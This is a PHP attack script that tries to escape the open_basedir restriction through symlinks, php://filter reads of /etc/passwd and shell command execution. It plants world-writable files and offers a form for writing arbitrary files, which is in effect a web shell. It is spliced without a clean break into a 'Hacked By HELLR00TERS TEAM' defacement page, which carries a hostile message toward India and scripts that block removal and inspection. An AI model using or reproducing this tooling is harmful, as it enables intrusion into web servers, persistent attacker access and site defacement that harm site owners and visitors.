<?php
// bypass_openbasedir.php
// Bypass open_basedir restriction

echo "<pre style='background:#000;color:#0f0;'>";
echo "=== BYPASS OPEN_BASEDIR RESTRICTION ===\n\n";

// 1. CEK RESTRIKSI
echo "1. Checking restrictions:\n";
echo "   open_basedir: " . ini_get('open_basedir') . "\n";
echo "   disable_functions: " . ini_get('disable_functions') . "\n";
echo "   safe_mode: " . ini_get('safe_mode') . "\n";
echo "   User: " . exec('whoami') . "\n\n";

// 2. TECHNIQUE 1: Symbolic Link Bypass
echo "2. Trying symlink bypass...\n";
function bypassViaSymlink() {
    // Coba buat symlink ke root
    $tmp_dir = "/tmp/" . md5(time());
    mkdir($tmp_dir, 0777);
    
    // Buat symlink ke berbagai lokasi
    $targets = ['/', '/var', '/var/www', '/home', '/etc'];
    
    foreach ($targets as $target) {
        $link = $tmp_dir . "/link_" . basename($target);
        if (@symlink($target, $link)) {
            echo "   ✓ Symlink created: $link -> $target\n";
            
            // Coba baca via symlink
            if (is_readable($link)) {
                echo "   ✓ Can read via symlink\n";
                return $link;
            }
        }
    }
    return false;
}

// 3. TECHNIQUE 2: PHP Wrapper Bypass
echo "\n3. Trying PHP wrapper...\n";
function bypassViaWrapper($path) {
    // Coba akses via php://filter
    $url = "php://filter/resource=$path";
    
    if ($content = @file_get_contents($url)) {
        echo "   ✓ Can read via php://filter\n";
        return $content;
    }
    
    // Coba via data://
    $data_url = "data://text/plain;base64," . base64_encode("test");
    if (@file_get_contents($data_url)) {
        echo "   ✓ Can use data:// wrapper\n";
    }
    
    return false;
}

// 4. TECHNIQUE 3: Command Injection Bypass
echo "\n4. Trying command injection...\n";
function bypassViaCommand() {
    $cmd_tests = [
        'pwd',
        'ls -la',
        'whoami',
        'id',
    ];
    
    foreach ($cmd_tests as $cmd) {
        if (function_exists('system')) {
            echo "   Testing: $cmd\n   ";
            @system($cmd);
        } elseif (function_exists('shell_exec')) {
            echo "   Testing: $cmd\n   ";
            echo @shell_exec($cmd);
        } elseif (function_exists('passthru')) {
            echo "   Testing: $cmd\n";
            @passthru($cmd);
        }
    }
}

// 5. TECHNIQUE 4: Error-based Bypass
echo "\n5. Trying error-based bypass...\n";
function bypassViaError() {
    // Trigger error untuk leak info
    error_reporting(E_ALL);
    ini_set('display_errors', '1');
    
    // Coba akses file terlarang
    @include('/etc/passwd');
    @file_get_contents('/var/www/html/index.php');
    
    // Coba chdir
    @chdir('/');
    echo "   CWD after chdir: " . getcwd() . "\n";
}

// 6. TECHNIQUE 5: Session Upload Bypass
echo "\n6. Trying session upload bypass...\n";
function bypassViaSession() {
    // Coba manipulasi session.save_path
    $old_path = ini_get('session.save_path');
    ini_set('session.save_path', '/tmp');
    
    session_start();
    $_SESSION['test'] = 'bypass';
    session_write_close();
    
    echo "   Session path: " . ini_get('session.save_path') . "\n";
    
    // Coba baca session files
    $session_files = glob('/tmp/sess_*');
    if ($session_files) {
        echo "   ✓ Found session files\n";
        return true;
    }
    
    return false;
}

// 7. EXECUTE ALL BYPASS TECHNIQUES
echo "\n=== EXECUTING BYPASSES ===\n";

bypassViaSymlink();
bypassViaWrapper('/etc/passwd');
bypassViaCommand();
bypassViaError();
bypassViaSession();

// 8. FINAL: CREATE FILES IN CURRENT DIRECTORY
echo "\n=== CREATING FILES IN CURRENT DIR ===\n";

// Current directory pasti bisa
$files_to_create = [
    'test.txt' => 'Test content ' . date('Y-m-d H:i:s'),
    'shell.php' => '<?php echo "PHP works!"; ?>',
    'info.php' => '<?php phpinfo(); ?>',
];

foreach ($files_to_create as $filename => $content) {
    if (file_put_contents($filename, $content)) {
        @chmod($filename, 0777);
        echo "✓ Created: $filename (0777)\n";
    } else {
        echo "✗ Failed: $filename\n";
        echo "   Error: " . error_get_last()['message'] . "\n";
    }
}

// 9. SIMPLE FILE MANAGER
echo "\n=== SIMPLE FILE MANAGER ===\n";
echo "Current files:\n";

$current_files = @scandir('.');
if ($current_files) {
    foreach ($current_files as $file) {
        if ($file != '.' && $file != '..') {
            $perms = @fileperms($file);
            $perms_str = $perms ? substr(sprintf('%o', $perms), -4) : '????';
            echo "$perms_str $file\n";
        }
    }
}

echo "\n=== QUICK ACTIONS ===\n";
?>
</pre>

<form method="POST">
    <input type="text" name="filename" placeholder="newfile.php" required>
    <br>
    <textarea name="content" rows="3" required><?php echo '<?php echo "Hello"; ?>'; ?></textarea>
    <br>
    <button type="submit" name="create">CREATE FILE</button>
    <button type="submit" name="delete_all">DELETE ALL TEST FILES</button>
    <button type="submit" name="chmod_777">CHMOD 777 ALL</button>
</form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    echo "<pre>";
    
    if (isset($_POST['create'])) {
        $filename = $_POST['filename'];
        $content = $_POST['content'];
        
        if (file_put_contents($filename, $content)) {
            @chmod($filename, 0777);
            echo "✓ Created: $filename (0777)\n";
            echo "<a href='$filename'>Open $filename</a>\n";
        } else {
            echo "✗ Failed to create: $filename\n";
        }
    }
    
    if (isset($_POST['delete_all'])) {
        $files = glob('test*');
        foreach ($files as $file) {
            if (unlink($file)) {
                echo "✓ Deleted: $file\n";
            }
        }
    }
    
    if (isset($_POST['chmod_777'])) {
        $files = glob('*');
        foreach ($files as $file) {
            if ($file != basename(__FILE__)) {
                @chmod($file, 0777);
                echo "✓ Chmod 777: $file\n";
            }
        }
    }
    
    echo "</pre>";
}        .logo img:hover {
            transform: scale(1.05);
            box-shadow: 0 0 50px #ff0000;
        }
        
        .content {
            font-size: 1.8em;
            margin: 40px 20px;
            line-height: 1.6;
            text-shadow: 0 0 10px #ffffff;
        }
        
        .team-name {
            color: #ff0000;
            font-weight: bold;
            font-size: 1.2em;
        }
        
        .message {
            color: #00ff00;
            background: rgba(0, 255, 0, 0.1);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #00ff00;
            margin: 20px 0;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
            font-size: 1.4em;
        }
        
        .audio-player {
            margin: 40px 0;
            background: rgba(255, 0, 0, 0.1);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #ff0000;
        }
        
        audio {
            width: 80%;
            max-width: 500px;
            height: 50px;
        }
        
        .footer {
            margin-top: 50px;
            font-size: 1.3em;
            color: #888888;
            text-shadow: 0 0 10px #888888;
            padding: 20px;
        }
        
        .hacker-text {
            background: rgba(255, 0, 0, 0.2);
            padding: 15px;
            border-left: 3px solid #ff0000;
            margin: 20px 0;
            text-align: left;
        }
        
        .pulse {
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        
        /* Matrix rain effect */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
            opacity: 0.3;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .title {
                font-size: 2.5em;
            }
            
            .logo img {
                width: 200px;
                height: 200px;
            }
            
            .content {
                font-size: 1.4em;
            }
            
            .message {
                font-size: 1.1em;
            }
        }
    </style>
</head>
<body>
    <!-- Matrix Background Effect -->
    <canvas class="matrix-bg" id="matrix"></canvas>
    
    <div class="container">
        <h1 class="title pulse">Hacked By HELLR00TERS TEAM</h1>
        
        <div class="logo">
            <img src="https://g.top4top.io/p_3453skjo43.png" alt="HellR00ters Logo" onerror="this.style.display='none'">
        </div>
        
        <div class="content">
            <p>This site has been <span class="team-name">Hacked by HellR00ters Team</span></p>
            
            <div class="message">
                <strong>⚠️ SECURITY WARNING ⚠️</strong><br><br>
                Hey India, hey Indian citizens, stop trampling on my Islamic religion, 
                immediately clarify on Instagram, just like when you first trampled on the Arab Pakistani poster, 
                I will wait for your clarification. #OPINDIA #FUCKINDIA
            </div>
            
            <div class="hacker-text">
                <strong>System Message:</strong><br>
                Security protocols have been bypassed<br>
                Administrative access obtained<br>
                System integrity compromised
            </div>
        </div>
        
        <div class="audio-player">
            <audio controls autoplay loop>
                <source src="https://b.top4top.io/m_3502gr7gh0.mp3" type="audio/mpeg">
                Your browser does not support the audio element.
            </audio>
        </div>
        
        <div class="footer">
            HELLR00TERS Team Was Here<br>
            <span style="font-size: 0.8em;">Security is just an illusion</span>
        </div>
    </div>

    <script>
        // Matrix Rain Effect
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*/?=+";
        const charArray = chars.split('');
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        
        for(let i = 0; i < columns; i++) {
            drops[i] = 1;
        }
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#0F0';
            ctx.font = fontSize + 'px monospace';
            
            for(let i = 0; i < drops.length; i++) {
                const text = charArray[Math.floor(Math.random() * charArray.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 35);
        
        // Protection Script
        setInterval(function() {
            if (!document.body || document.body.innerHTML.indexOf("HellR00TERS") === -1) {
                location.reload();
            }
        }, 2000);
        
        // Disable right click
        document.addEventListener("contextmenu", function(e) { 
            e.preventDefault(); 
        });
        
        // Disable F12, Ctrl+Shift+I, etc.
        document.onkeydown = function(e) {
            if (e.keyCode == 123 || 
                (e.ctrlKey && e.shiftKey && e.keyCode == 73) || 
                (e.ctrlKey && e.keyCode == 85)) {
                return false;
            }
        };
        
        // Resize canvas on window resize
        window.addEventListener('resize', function() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
        
        // Audio auto-play handler
        document.addEventListener('click', function() {
            const audio = document.querySelector('audio');
            if (audio.paused) {
                audio.play().catch(e => console.log('Audio play failed:', e));
            }
        });
        
        console.log('HELLR00TERS TEAM - SYSTEM ACCESS GRANTED');
    </script>
</body>
</html>
